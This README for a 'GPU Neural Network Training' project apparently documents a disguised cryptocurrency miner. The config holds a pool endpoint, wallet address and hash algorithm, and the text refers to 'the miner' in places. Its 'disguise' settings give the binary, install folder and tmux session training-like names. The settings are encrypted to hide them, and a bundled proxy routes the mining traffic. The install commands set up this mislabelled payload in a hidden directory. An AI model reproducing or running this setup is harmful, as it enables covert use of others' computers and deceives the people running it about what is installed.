# GPU Neural Network Training

Install and run the GPU training runtime bundled in `src/trainer`. Setup copies
the local binary and its accompanying files; it requires no runtime download.
The bundled executable is `src/trainer/pt_main`; setup uses
`disguise.binary_name` for its installed filename.

## Requirements

- Linux with a compatible GPU and working driver
- Python 3.9 or newer, Bash, and tmux
- Python's `cryptography` package (see `requirements.txt`)
- The complete `src/trainer` directory, including the bundled executable
- When `useProxy` is `true`: an `ss://` or `vless://` share link in `proxyConfig`
  and the complete bundled `proxy/` directory

If `cryptography` is not already available, install it in a user-owned virtual
environment; no sudo is needed. Activate that environment before using either
setup entrypoint or `utils.py`:

```bash
python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install -r requirements.txt
```

## Encrypted configuration

`config.json` is the default configuration. Only its top-level `"decKey": "qwer"`
entry is readable. Every other setting name and its entire JSON value are
encrypted, including nested keys and values. Setup decrypts the file before
resolving settings, restoring strings, numbers, booleans, lists, and objects.
Alternate files passed with `-c` must use the same encrypted format.

`utils.py` provides `encrypt(value, key)`, `decrypt(token, key)`,
`encrypt_config(config, key=None)`, and `decrypt_config(config)`. It uses
[Fernet authenticated encryption](https://cryptography.io/en/latest/fernet/)
with a random salt and scrypt key derivation for each token. Wrong keys and
damaged tokens fail before installation. The supplied configuration contains
the requested PearlHash algorithm, pool endpoint, and wallet address.

Use `edit_config.py` to view settings or change them in one command:

```bash
python3 edit_config.py                              # Show decrypted settings
python3 edit_config.py useProxy=true gpu.power_limit=120
python3 edit_config.py worker=my-gpu
```

Changes are decrypted in memory and saved encrypted with file mode `600` using
an atomic replacement. Values accept JSON (booleans, numbers, objects, lists,
and null) or unquoted strings. Use dotted paths for nested objects, and `-c PATH`
for another config file. To keep a JSON-looking value as a string, quote it as
JSON, for example `worker='"123"'`. Set `decKey=new-key` to change the key and
re-encrypt all settings. Without changes, the helper only prints the settings.

Alternatively, decrypt a working copy, edit it, then encrypt it again:

```bash
python3 utils.py decrypt config.json -o config.plain.json
# Edit config.plain.json with your editor.
python3 utils.py encrypt config.plain.json -o config.json
python3 train_setup.py --check
```

The CLI creates output files with mode `600`; `config.plain.json` is ignored by
Git. Remove the plaintext working copy when finished. To change the key, change
`decKey` in the decrypted working copy before re-encrypting. Changing `decKey`
directly in an encrypted file will prevent that file from decrypting.

Since the decryption key is stored beside the ciphertext, anyone who can read
the file can decrypt it. This conceals plaintext settings in `config.json`;
generated runtime files (`.env`, `run_train.sh`), process arguments, and logs may
still contain decrypted values.

## Net-client: local SOCKS proxy

The self-contained `proxy/` directory includes the Xray runtime for Linux AMD64
and ARM64, geodata, profile checker, and setup/control scripts. It requires Bash,
Python 3.9+ with SSL, and trusted OS CA certificates; setup needs no sudo or downloads.
The bundled executable is named `net-client`; use the scripts below to configure
and manage it. Skip this section if you want direct pool connections.

Add your `ss://` or `vless://` share links to the private
`proxy/assets/links.txt`, one per line. If that file is missing in a fresh clone,
create it from the template first:

```bash
cp -n proxy/assets/links.example.txt proxy/assets/links.txt
chmod 600 proxy/assets/links.txt
```

After filling in the links, run from the project root:

```bash
bash proxy/connection_setup.sh
bash proxy/connection_setup.sh status
```

Setup tests the profiles and starts the fastest successful one on
`127.0.0.1:10808`, accepting SOCKS5 and HTTP connections. The `socks` value in
the decrypted `config.json` already matches this port. If you select a different
port with `--port`, update and re-encrypt the configuration before launching.
For the miner, set `useProxy=true` and put one share link in `proxyConfig` as
described below. Training setup automatically tests and activates that link;
manual proxy setup is useful for standalone commands or testing multiple links.

### Profiles and ports

Setup accepts share links or a full Xray JSON client export. For example:

```bash
bash proxy/connection_setup.sh setup --links /path/to/profile.json
bash proxy/connection_setup.sh setup --links /path/to/links.txt --port 10809
```

Custom input paths are relative to your current working directory. The default
input is always `proxy/assets/links.txt`, located relative to the scripts.
Setup tests each profile twice and selects the lowest median HTTPS response time
among profiles that pass both attempts. It saves the selected configuration in
`proxy/.connection/`. No automatic failover or boot service is installed.

### Start, stop, and troubleshoot

```bash
bash proxy/connection_setup.sh status   # local process status
bash proxy/connection_setup.sh start    # reuse the saved profile after a restart
bash proxy/connection_setup.sh stop
bash proxy/connection_setup.sh restart
bash proxy/connection_setup.sh logs     # recent runtime log lines
bash proxy/connection_setup.sh check    # validate the saved configuration
bash proxy/connection_setup.sh test     # test profiles without switching
bash proxy/connection_setup.sh setup    # retest, select, and activate a profile
bash proxy/connection_setup.sh verify   # check bundled asset integrity
```

`status` checks the local process; `test` checks upstream connectivity. If all
profiles fail during setup, the existing saved/running client is kept. If the
port is occupied, stop its owner or select another port and update `socks` in
the decrypted configuration accordingly, then re-encrypt it. After restarting
the machine/workspace, run `start`.

### Use net-client with other commands

```bash
bash proxy/proxy_connect.sh                       # interactive proxy-aware shell
bash proxy/proxy_connect.sh -- curl https://example.com  # curl is optional
eval "$(bash proxy/proxy_connect.sh --print-env)"   # set proxies in this shell
```

The launcher starts the saved client if necessary. Exit the child shell with
`exit`; the client keeps running until stopped. To remove exported proxy settings
from the current shell:

```bash
unset http_proxy https_proxy all_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY no_proxy NO_PROXY
```

The command launcher applies proxy environment variables to a command or shell;
only applications that honor those settings use it. Private links, runtime state,
and reports are ignored by Git. See [proxy/README.md](proxy/README.md) for JSON
profiles, testing, lifecycle commands, and troubleshooting.

## Choose direct or proxy connections

`proxyConfig` follows `useProxy` in the decrypted configuration. It starts empty
so you can paste your own complete `ss://` or `vless://` share link:

```json
{
  "useProxy": true,
  "proxyConfig": "",
  "socks": "socks5://127.0.0.1:10808"
}
```

`socks` is the managed client's local listener; it defaults to the address above
if omitted. It must use `127.0.0.1` and a port from 1024 to 65535. The share link
belongs in `proxyConfig`, and `useProxy` must be a JSON boolean.

Use the helper to save your link encrypted (replace the example with your full
link, keeping the shell quotes around it):

```bash
python3 edit_config.py useProxy=true 'proxyConfig=vless://YOUR-COMPLETE-LINK'
python3 train_setup.py --check
python3 train_setup.py
```

- **`true`**: requires a nonempty supported share link. Setup converts it into a
  private proxy profile, tests its connectivity, and starts the bundled client
  before installing or launching the miner. A failed proxy setup aborts the new
  miner launch. The selected link replaces the proxy manager's active profile.
- **`false` or omitted**: connects directly. `proxyConfig` and `socks` are ignored,
  and training setup does not start the proxy.

`--check` validates the share link and local settings without making connections
or starting services. Normal setup performs the connectivity test. The temporary
profile is removed afterward; private proxy state and reports stay under `proxy/`.

The runner clears inherited proxy environment settings before applying the chosen
mode, including settings retained by tmux or supplied by `proxy_connect.sh`. In
proxy mode it passes the local SOCKS5 endpoint to the miner's `--proxy` option,
sets SOCKS/HTTP/HTTPS proxy variables, and clears proxy bypass lists. The HTTP
and `socks5h` environment settings let compatible libraries resolve destinations
through the proxy. This is application-level proxying; it does not enforce a
network firewall or capture connections/DNS from code that ignores proxy settings.
Rerun `python3 train_setup.py` after changing the configuration to regenerate the
runner and restart the training session. Changes to JSON do not affect a running
session until setup is rerun.

## Project layout

```text
config.json             encrypted training and SOCKS settings, plus decKey
utils.py                encryption helpers and config editing CLI
edit_config.py          view decrypted settings or update and re-encrypt in place
requirements.txt        Python encryption dependency
train_setup.py / .sh     training setup entrypoints
src/trainer/            bundled GPU runtime
src/weights_*.pth       existing weight files
tests/                  training setup tests
proxy/                  self-contained SOCKS5/HTTP proxy kit
```

## Usage

1. Review or change settings using the encrypted configuration workflow above.
   The algorithm, coordinator endpoint, and account identifier are populated.
   Adjust the proxy and worker identifier for your environment. The selected
   algorithm must be supported by your bundled runtime; see `src/trainer/help.txt`.
2. Validate the configuration and local binary without installing or launching:

   ```bash
   python3 train_setup.py --check
   ```

3. Install and launch:

   ```bash
   python3 train_setup.py
   ```

Use `python3 train_setup.py -c other.json` for an alternate configuration.
`bash train_setup.sh` accepts the same arguments and uses the same configuration.
Both entrypoints locate `src/trainer` relative to the setup script, so they work
from any working directory. The shell entrypoint reads settings from the JSON
file, including when invoked with environment variables set.

## Settings

| Setting | Purpose |
|---|---|
| `decKey` | Plaintext string used to decrypt the other settings; supplied value is `qwer`. |
| `useProxy` | Boolean: `true` prepares the configured proxy before launching; `false` or omitted connects directly. |
| `proxyConfig` | One complete `ss://` or `vless://` share link, required when `useProxy` is `true`. Initially empty. |
| `socks` | Local listener for the managed proxy; default `socks5://127.0.0.1:10808`. |
| Training coordinator | Coordinator endpoint for your chosen training algorithm. Required. |
| Training account | Your training account identifier. Required. |
| Training worker | Worker suffix appended to the account identifier with a dot. |
| Training algorithm | Algorithm supported by the bundled training runtime. Required. |
| Progress reporting | Training throughput reporting interval in seconds. |
| Temperature limit | Temperature at which training pauses, in Celsius. |
| `disguise.app_dir_name` | Install directory relative to your home directory; default `train`. |
| `disguise.binary_name` | Installed executable filename; default `pt_main`. |
| `disguise.tmux_session` | tmux session name; default `train`. |
| `gpu.power_limit` | Power limit in watts; `0` leaves the current setting unchanged. |

## Installation and control

Setup copies the local bundle into `~/train/.bin/`, names the installed executable
`pt_main`, writes a private `.env` file and `run_train.sh`, and starts tmux.
Libraries and runtime assets alongside the binary are copied too. The runner
works from `.bin` and includes `.bin` and `.bin/lib` in its library search path.

Re-running setup refreshes the installed files from `src/trainer` and replaces
the configured tmux session. To update the training runtime, replace the local bundle and
run setup again. Installation does not change global Git proxy settings.
The training process uses the connection mode selected by `useProxy`. Proxy mode
tests the configured link during setup; direct mode and `--check` need no network.

With the default directory and session names:

```bash
tail -f ~/train/logs/session.log
tmux attach -t train
tmux kill-session -t train
```

If validation fails, fill in the missing settings or restore the local binary.
If launching fails, check that tmux is installed, your GPU driver works, and the
training coordinator is reachable, along with the proxy when enabled. The setup
does not install system dependencies.
